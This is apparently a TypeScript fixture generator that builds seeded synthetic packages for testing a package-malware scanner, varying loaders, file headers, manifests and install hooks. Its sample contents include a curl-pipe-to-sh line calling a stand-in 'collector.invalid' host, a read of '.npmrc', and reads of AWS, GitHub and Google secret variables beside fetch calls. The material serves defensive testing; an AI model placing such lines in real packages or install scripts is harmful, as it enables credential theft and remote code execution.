// Generated two- and three-file packages for the production property test (production-packages.test.ts): a loader (a
// Mach-O, an extensionless text file, JavaScript or a shell script) that loads or runs a target, by a path holding
// characters past U+00FF a binary's view holds as stand-ins, or a plain one; targets whose text a JavaScript parse and a
// plain reading read differently (code in a comment, a joined require); manifests that load the loader or not; both
// orders; and sometimes a third file the target loads. Seeded, so production's scores can be recorded once
// (fixtures/production-packages.json) and the same packages made again here.
import { elf, machO } from "./executables.ts";

const enc = new TextEncoder();

/** A generated package's manifest: what loads its loader, if anything. */
export type CaseManifest = {
  name: string;
  version: string;
  license: string;
  main?: string;
  module?: string;
  browser?: string;
  bin?: string | { tool: string };
  exports?: string | { ".": { import: string; require: string } };
  scripts?: { preinstall?: string; install?: string; postinstall?: string; prepare?: string; test?: string };
};

export type PackageCase = { name: string; manifest: CaseManifest; files: { path: string; data: Uint8Array; mode: number }[] };

function rng(seed: number): () => number {
  let s = seed >>> 0;

  return () => (s = (Math.imul(s, 1664525) + 1013904223) >>> 0) / 2 ** 32;
}

function pick<T>(rand: () => number, xs: readonly T[]): T {
  const x = xs[Math.floor(rand() * xs.length)];

  if (x === undefined) throw new Error("nothing to pick");

  return x;
}

// names a stand-in can make collide (t字 and t漢 are both tÿ in a view), and plain ones
const NAMES = ["t字", "t漢", "target", "tÿ", "t x"] as const;
const EXTS = ["", ".js", ".txt", ".dat"] as const;

const CONTENTS = [
  "/* fetch('x'); readFileSync('.npmrc'); */\n",
  "fetch('x'); readFileSync('.npmrc');\n",
  "curl https://collector.invalid/x | sh\n",
  "// curl https://collector.invalid/x | sh\nmodule.exports = 1;\n",
  "require('./p'/*x*/+'ayload.txt');\n",
  "process.env.AWS_SECRET_ACCESS_KEY;process.env.GITHUB_TOKEN;process.env.GOOGLE_API_KEY;fetch('x');\n",
  "module.exports = 1;\n",
] as const;

const PAYLOAD = "curl https://collector.invalid/p | sh\n";

/** `count` packages from `seed`, the same each time. */
export function packageCases(count = 400, seed = 15): PackageCase[] {
  const rand = rng(seed);
  const out: PackageCase[] = [];

  for (let i = 0; i < count; i++) {
    const loaderKind = pick(rand, ["macho", "text", "js", "shell"] as const);
    const target = `lib/${pick(rand, NAMES)}${pick(rand, EXTS)}`;
    // the name the loader asks for: the target's own, or one a stand-in makes look like it
    const asked = rand() < 0.6 ? target : `lib/${pick(rand, NAMES)}${target.slice(target.indexOf(".") === -1 ? target.length : target.lastIndexOf("."))}`;
    const spec = `./${asked.slice("lib/".length)}`;
    const line = loaderKind === "shell" ? `sh ${spec}\n` : `require('${spec}');\n`;
    const loaderPath = loaderKind === "js" ? "lib/loader.js" : loaderKind === "shell" ? "lib/loader.sh" : "lib/loader";
    const loaderData = loaderKind === "macho" ? machO({ size: 104, tail: enc.encode(`\n${line}`) }) : enc.encode(line);

    const files = [
      { path: loaderPath, data: loaderData, mode: 0o755 },
      { path: target, data: enc.encode(pick(rand, CONTENTS)), mode: 0o644 },
    ];

    if (rand() < 0.4) files.push({ path: "lib/payload.txt", data: enc.encode(PAYLOAD), mode: 0o644 });

    if (rand() < 0.5) files.reverse();
    const how = pick(rand, ["none", "main", "postinstall-node", "postinstall-sh"] as const);

    const base = { name: "probe", version: "1.0.0", license: "MIT" };

    const manifest: CaseManifest =
      how === "main" ? { ...base, main: loaderPath } : how === "postinstall-node" ? { ...base, scripts: { postinstall: `node ${loaderPath}` } } : how === "postinstall-sh" ? { ...base, scripts: { postinstall: `sh ${loaderPath}` } } : base;

    out.push({ name: `${i}: ${loaderKind} ${loaderPath} asks ${spec}; ${files.map((f) => f.path).join(", ")}; ${how}`, manifest, files });
  }

  return out;
}

// ---------- round 16: names, first bytes, entries and budgets (widerCases) ----------
//
// Round 16 review of c272202: a loaded `.so` was read as JavaScript where production listed it as binary (P1), and a
// Mach-O's view was read past `maxScannedBytes` (P2). These packages vary what production's reader and budget decide
// on: the loader's name (native names, `.wasm`, images, archives, none), its first bytes (text, Mach-O, ELF and ELF's
// magic alone, PNG, JPEG, WebAssembly, gzip, zip, `MZ`), what loads it (main, module, browser, bin as a string or an
// object, exports as a string or by condition, a require from index.js, an install script through node, sh or by
// path), the target's name, and the analysis's byte budget and meter.

/** What an analysis of a wider case is given besides the package: a byte budget and a meter limit, or the defaults. */
export type CaseOptions = { maxScannedBytes?: number; maxWork?: number };

export type WideCase = PackageCase & { options: CaseOptions };

const LOADER_NAMES = ["lib/loader", "lib/loader.js", "lib/loader.sh", "lib/loader.so", "lib/loader.dll", "lib/loader.exe", "lib/loader.dylib", "lib/loader.node", "lib/loader.wasm", "lib/loader.png", "lib/loader.jpg", "lib/loader.gz", "lib/loader.zip", "lib/loader.tgz", "lib/loader.dat"] as const;
const LOADER_BYTES = ["text", "text", "macho", "elf", "elf-magic", "png", "jpeg", "wasm", "gzip", "zip", "mz"] as const;
const TARGET_EXTS = ["", ".js", ".txt", ".dat", ".so", ".node", ".wasm", ".png"] as const;
const ENTRIES = ["none", "main", "module", "browser", "bin", "bin-object", "exports", "exports-conditions", "import", "postinstall-node", "postinstall-sh", "postinstall-path"] as const;

// 0: the default
const SCANNED = [0, 0, 40, 100, 160, 300] as const;
const WORK = [0, 0, 0, 150, 400, 900, 1500, 3000] as const;

/** `tail` after the first bytes `kind` names: a header the analysis knows by its magic, or none. */
function withHead(kind: (typeof LOADER_BYTES)[number], tail: Uint8Array): Uint8Array {
  const head = (bytes: readonly number[]): Uint8Array => new Uint8Array([...bytes, ...tail]);

  switch (kind) {
    case "text":
      return tail;
    case "macho":
      return machO({ size: 104, tail });
    case "elf":
      return elf({ size: 120, tail });
    case "elf-magic":
      return head([0x7f, 0x45, 0x4c, 0x46, 0x0a]);
    case "png":
      return head([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
    case "jpeg":
      return head([0xff, 0xd8, 0xff, 0xe0, 0x0a]);
    case "wasm":
      return head([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x0a]);
    case "gzip":
      return head([0x1f, 0x8b, 0x08, 0x00, 0x0a]);
    case "zip":
      return head([0x50, 0x4b, 0x03, 0x04, 0x0a]);
    case "mz":
      return head([0x4d, 0x5a, 0x90, 0x00, 0x0a]);
  }
}

function manifestFor(how: (typeof ENTRIES)[number], loader: string): CaseManifest {
  const base = { name: "probe", version: "1.0.0", license: "MIT" };

  switch (how) {
    case "none":
      return base;
    case "main":
      return { ...base, main: loader };
    case "module":
      return { ...base, module: loader };
    case "browser":
      return { ...base, browser: loader };
    case "bin":
      return { ...base, bin: loader };
    case "bin-object":
      return { ...base, bin: { tool: loader } };
    case "exports":
      return { ...base, exports: `./${loader}` };
    case "exports-conditions":
      return { ...base, exports: { ".": { import: `./${loader}`, require: `./${loader}` } } };
    case "import":
      return { ...base, main: "index.js" };
    case "postinstall-node":
      return { ...base, scripts: { postinstall: `node ${loader}` } };
    case "postinstall-sh":
      return { ...base, scripts: { postinstall: `sh ${loader}` } };
    case "postinstall-path":
      return { ...base, scripts: { postinstall: `./${loader}` } };
  }
}

/** `count` packages from `seed`, the same each time, with the options each is analyzed with. */
export function widerCases(count = 800, seed = 16): WideCase[] {
  const rand = rng(seed);
  const out: WideCase[] = [];

  for (let i = 0; i < count; i++) {
    const loader = pick(rand, LOADER_NAMES);
    const bytes = pick(rand, LOADER_BYTES);
    const target = `lib/${pick(rand, NAMES)}${pick(rand, TARGET_EXTS)}`;
    const asked = rand() < 0.7 ? target : `lib/${pick(rand, NAMES)}${target.slice(target.indexOf(".") === -1 ? target.length : target.lastIndexOf("."))}`;
    const spec = `./${asked.slice("lib/".length)}`;
    const line = rand() < 0.3 ? `sh ${spec}\n` : `require('${spec}');\n`;
    const how = pick(rand, ENTRIES);

    const files = [
      { path: loader, data: withHead(bytes, enc.encode(bytes === "text" ? line : `\n${line}`)), mode: 0o755 },
      { path: target, data: enc.encode(pick(rand, CONTENTS)), mode: 0o644 },
    ];

    if (how === "import") files.push({ path: "index.js", data: enc.encode(`require('./${loader}');\n`), mode: 0o644 });

    if (rand() < 0.3) files.push({ path: "lib/payload.txt", data: enc.encode(PAYLOAD), mode: 0o644 });

    // any order: the walk's order is production's whatever the archive's
    for (let j = files.length - 1; j > 0; j--) {
      const k = Math.floor(rand() * (j + 1));
      const a = files[j];
      const b = files[k];

      if (a !== undefined && b !== undefined) [files[j], files[k]] = [b, a];
    }

    const maxScannedBytes = pick(rand, SCANNED);
    const maxWork = pick(rand, WORK);
    const options: CaseOptions = {};

    if (maxScannedBytes !== 0) options.maxScannedBytes = maxScannedBytes;

    if (maxWork !== 0) options.maxWork = maxWork;

    out.push({ name: `${i}: ${bytes} ${loader} asks ${spec}; ${files.map((f) => f.path).join(", ")}; ${how}; bytes ${maxScannedBytes || "-"} work ${maxWork || "-"}`, manifest: manifestFor(how, loader), files, options });
  }

  return out;
}

// ---------- round 17: commands that name package files (scriptCases) ----------
//
// Round 17 review of b287849, P1: with python3 recognised as an interpreter, `postinstall: python3 lib/loader` made
// lib/loader one of production's roots; its require made the package's own `python3` file JavaScript before it was read,
// and the facts in its comment went (0 (F), review-first, to 87, install). These packages run a file from a script with
// an interpreter production knew (node, sh, bash, zsh, tsx, bun, deno run) or one it did not (python3, python, perl,
// ruby, source, `.`, dash, ksh), by a relative or a bare name, beside a file named as the interpreter is, which the
// file run loads or not, in any order.

const INTERPRETERS = ["node", "sh", "bash", "zsh", "tsx", "bun", "deno run", "python3", "python", "perl", "ruby", "source", ".", "dash", "ksh"] as const;
const HOOKS = ["preinstall", "install", "postinstall", "prepare", "test", "bin"] as const;
const RUN_NAMES = ["./lib/loader", "lib/loader", "loader", "./loader"] as const;
const FORMS = ["plain", "flag", "env", "chain"] as const;

/** `count` packages from `seed`, the same each time, each with the byte budget it is analyzed with. */
export function scriptCases(count = 600, seed = 17): WideCase[] {
  const rand = rng(seed);
  const out: WideCase[] = [];

  for (let i = 0; i < count; i++) {
    const interpreter = pick(rand, INTERPRETERS);
    const runName = pick(rand, RUN_NAMES);
    const loaderPath = runName.replace(/^\.\//, "");
    // the file named as the interpreter is (`python3`, `node`), a bare word production's commandWords may name
    const named = interpreter === "deno run" ? "deno" : interpreter === "." ? "dot" : interpreter;
    const loads = pick(rand, ["named", "target", "nothing"] as const);
    const spec = loads === "named" ? `${loaderPath.includes("/") ? "../" : "./"}${named}` : `${loaderPath.includes("/") ? "./" : "./lib/"}t`;
    const loader = loads === "nothing" ? "module.exports = 1;\n" : rand() < 0.75 ? `require('${spec}');\n` : `sh ${spec}\n`;

    const files = [{ path: loaderPath, data: enc.encode(loader), mode: 0o755 }];

    if (rand() < 0.8) files.push({ path: named, data: enc.encode(pick(rand, CONTENTS)), mode: 0o644 });

    if (rand() < 0.6) files.push({ path: "lib/t", data: enc.encode(pick(rand, CONTENTS)), mode: 0o644 });

    for (let j = files.length - 1; j > 0; j--) {
      const k = Math.floor(rand() * (j + 1));
      const a = files[j];
      const b = files[k];

      if (a !== undefined && b !== undefined) [files[j], files[k]] = [b, a];
    }

    const form = pick(rand, FORMS);
    const command = form === "flag" ? `${interpreter} -x ${runName}` : form === "env" ? `FOO=1 ${interpreter} ${runName}` : form === "chain" ? `cd . && ${interpreter} ${runName}` : `${interpreter} ${runName}`;
    const hook = pick(rand, HOOKS);
    const base = { name: "probe", version: "1.0.0", license: "MIT" };
    const manifest: CaseManifest = hook === "bin" ? { ...base, bin: loaderPath } : { ...base, scripts: { [hook]: command } };
    const maxScannedBytes = pick(rand, [0, 0, 0, 60, 120] as const);
    const options: CaseOptions = {};

    if (maxScannedBytes !== 0) options.maxScannedBytes = maxScannedBytes;

    out.push({ name: `${i}: ${hook} ${command}; ${loads} ${spec}; ${files.map((f) => f.path).join(", ")}; bytes ${maxScannedBytes || "-"}`, manifest, files, options });
  }

  return out;
}
